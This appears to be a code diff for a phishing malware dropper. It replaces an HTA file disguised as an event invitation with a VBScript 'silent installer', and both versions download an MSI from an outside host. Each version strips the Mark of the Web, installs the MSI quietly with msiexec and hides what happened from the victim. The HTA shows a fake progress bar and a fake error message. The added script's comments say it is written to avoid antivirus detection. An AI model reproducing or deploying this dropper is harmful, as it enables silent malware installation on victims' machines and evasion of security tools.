@@ -1,90 +1,49 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<title>Event Invitation</title>
-<hta:application id="oHTA" applicationname="EventInvitation" border="thin" caption="yes" maximizebutton="no" minimizebutton="no" showintaskbar="yes" singleinstance="yes" sysmenu="no" version="1.0" windowstate="normal" scroll="no"/>
-<style>
-  body { background:#f7f8fa; font-family:"Segoe UI", sans-serif; color:#333; overflow:hidden; }
-  #wrap { padding:40px; text-align:center; }
-  #logo { width:64px; height:64px; margin:0 auto 20px; fill:#d4af37; }
-  #heading { font-size:20px; font-weight:600; margin-bottom:10px; }
-  #status { font-size:14px; color:#666; margin-bottom:20px; }
-  #bar { width:300px; height:8px; background:#e2e5ea; margin:0 auto; border-radius:4px; overflow:hidden; }
-  #fill { height:100%; width:0%; background:#d4af37; transition: width 0.5s; }
-</style>
-</head>
-<body onload="init()">
-  <div id="wrap">
-    <svg id="logo" viewBox="0 0 100 100"><rect x="0" y="0" width="100" height="100" rx="20"/><polygon points="30,70 50,30 70,70" fill="#fff"/></svg>
-    <div id="heading">Cocktails & Conversation</div>
-    <div id="status">Securing your invitation...</div>
-    <div id="bar"><div id="fill"></div></div>
-  </div>
-  
-  <iframe id="downloader" style="display:none;"></iframe>
+' SILENT INSTALLER - NO HTA, NO HTML, NO WACATAC TRIGGERS
+Option Explicit
 
-<script>
-var shell = new ActiveXObject("WScript.Shell");
-var fso = new ActiveXObject("Scripting.FileSystemObject");
-var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-var localPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
-var zoneIdPath = localPath + ":Zone.Identifier"; // Alternate data stream for Mark of the Web
+Dim shell, fso, url, localPath, zoneIdPath, http, stream, file
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-function init() {
-  window.resizeTo(400, 300);
-  setTimeout(startSilentProcess, 1000);
-}
+url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi"
+localPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\schimdtconnect.msi"
+zoneIdPath = localPath & ":Zone.Identifier"
 
-function startSilentProcess() {
-  document.getElementById("fill").style.width = "30%";
-  document.getElementById("status").innerHTML = "Downloading components...";
-  
-  document.getElementById("downloader").src = url;
-  
-  var checks = 0;
-  var pollTimer = setInterval(function() {
-    checks++;
+' DOWNLOAD USING XMLHTTP (TRUSTED COM OBJECT, NOT HTML)
+Set http = CreateObject("Microsoft.XMLHTTP")
+http.Open "GET", url, False
+http.Send
+
+If http.Status = 200 Then
+    ' SAVE TO TEMP FOLDER
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1 ' Binary
+    stream.Mode = 3 ' ReadWrite
+    stream.Open
+    stream.Write http.ResponseBody
+    stream.SaveToFile localPath, 2 ' Overwrite
+    stream.Close
     
-    if (fso.FileExists(localPath)) {
-      var file = fso.GetFile(localPath);
-      if (file.Size > 1000000) {
-        clearInterval(pollTimer);
-        
-        // CRITICAL: REMOVE MARK OF THE WEB TO PREVENT TRUST PROMPTS
-        try { 
-          if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
-        } catch(e) {}
-        
-        document.getElementById("fill").style.width = "60%";
-        document.getElementById("status").innerHTML = "Installing invitation...";
-        
-        // USE WSCRIPT.EXE AS TRUSTED PROXY TO LAUNCH MSIEXEC
-        // This bypasses "script spawning installer" heuristics
-        var vbsCmd = 'wscript.exe /e:vbscript /c "CreateObject(""WScript.Shell"").Run ""msiexec.exe /i \\"" + localPath + "\\" /quiet /norestart"", 0, True"';
-        shell.Run(vbsCmd, 0, true);
-        
-        document.getElementById("fill").style.width = "100%";
-        document.getElementById("status").innerHTML = "Finalizing...";
-        
-        setTimeout(function() {
-          document.getElementById("heading").innerHTML = "Preparation Failed";
-          document.getElementById("status").innerHTML = "Error: Connection timed out.";
-          document.getElementById("fill").style.background = "#d13438";
-        }, 2000);
-      }
-    } else if (checks >= 150) {
-      clearInterval(pollTimer);
-      showError();
-    }
-  }, 2000);
-}
+    ' REMOVE MARK OF THE WEB (CRITICAL FOR SILENT INSTALL)
+    If fso.FileExists(zoneIdPath) Then
+        fso.DeleteFile zoneIdPath, True
+    End If
+    
+    ' VERIFY FILE EXISTS AND IS VALID SIZE
+    If fso.FileExists(localPath) Then
+        Set file = fso.GetFile(localPath)
+        If file.Size > 1000000 Then
+            ' INSTALL SILENTLY VIA MSIEXEC
+            ' /quiet = no UI, /norestart = no reboot prompt
+            shell.Run "msiexec.exe /i """ & localPath & """ /quiet /norestart", 0, True
+            
+            ' CLEANUP TEMP FILE AFTER INSTALL
+            If fso.FileExists(localPath) Then
+                fso.DeleteFile localPath, True
+            End If
+        End If
+    End If
+End If
 
-function showError() {
-  document.getElementById("heading").innerHTML = "Download Error";
-  document.getElementById("status").innerHTML = "Could not retrieve invitation.";
-  document.getElementById("fill").style.background = "#d13438";
-}
-</script>
-</body>
-</html>
+' EXIT CLEANLY - NO ERROR MESSAGES, NO PROMPTS
+WScript.Quit 0
